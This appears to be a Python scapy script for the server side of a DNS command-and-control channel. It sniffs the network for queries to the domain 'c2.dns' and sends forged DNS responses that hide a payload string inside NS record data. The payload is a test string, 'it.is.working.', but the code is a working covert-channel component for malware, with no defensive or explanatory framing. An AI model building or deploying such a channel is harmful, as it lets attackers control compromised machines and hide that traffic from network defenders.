#!/bin/env python3
from dns_utils import *
from scapy.all import *

my_iface = "eth0"
DOMAIN = b"c2.dns"

def handler(pkt: Packet, domain: bytes, payload):
    if pkt.haslayer(UDP) and pkt.haslayer(DNSQR) and domain in pkt[DNSQR].qname:
        print("Found!")
        res_pkt = Craft_Response_packet(pkt, domain, payload)
        print(extract_rdata_from_dns_response(res_pkt))
        send(res_pkt)

def extract_rdata_from_dns_response(response_pkt: Packet):
    ns1_record = response_pkt[DNS].ns[0]
    return ns1_record.rdata


def Wait_for_pkt(domain: bytes, src_ip: str):
    my_ip = get_my_ip_address(my_iface)
    print(f"My IP: {my_ip}")
    filter = f"dst host {my_ip}"
    print(filter)
    sniff(filter=filter, prn=lambda pkt: handler(pkt, domain, b"it.is.working."), iface=my_iface)[0]

def Craft_Response_packet(req_pkt: Packet, domain: bytes, payload: bytes):
    ip = IP(version=4, dst=req_pkt[IP].src)

    udp = UDP(sport=req_pkt[UDP].dport, dport=req_pkt[UDP].sport)

    qname = req_pkt[DNSQR].qname

    dnsq = DNSQR(qname=qname, qtype='A', qclass='IN')
    dnsr_an = DNSRR(rrname=qname, type='A', rclass='IN', ttl=604800, rdlen=4, rdata='192.0.0.1')
    rdata = payload.decode() + domain.decode()
    ns1 = DNSRR(rrname=domain, type='NS', rclass='IN', ttl=604800, rdata=rdata)
    ns2 = DNSRR(rrname=domain, type='NS', rclass='IN', ttl=604800, rdata='ns2.' + domain.decode())  # Change this as needed
    dns_ns = ns1 / ns2

    dns = DNS(id=req_pkt[DNS].id, qr=1, opcode=0, qd=dnsq, an=dnsr_an, ns=dns_ns, aa=0, rd=1, ra=1, ad=1, cd=1)
    
    pkt = ip / udp / dns
    return pkt

if '__main__' == __name__:
    while True:
        Wait_for_pkt(DOMAIN, "192.168.3.3")
        # create_dns_packet()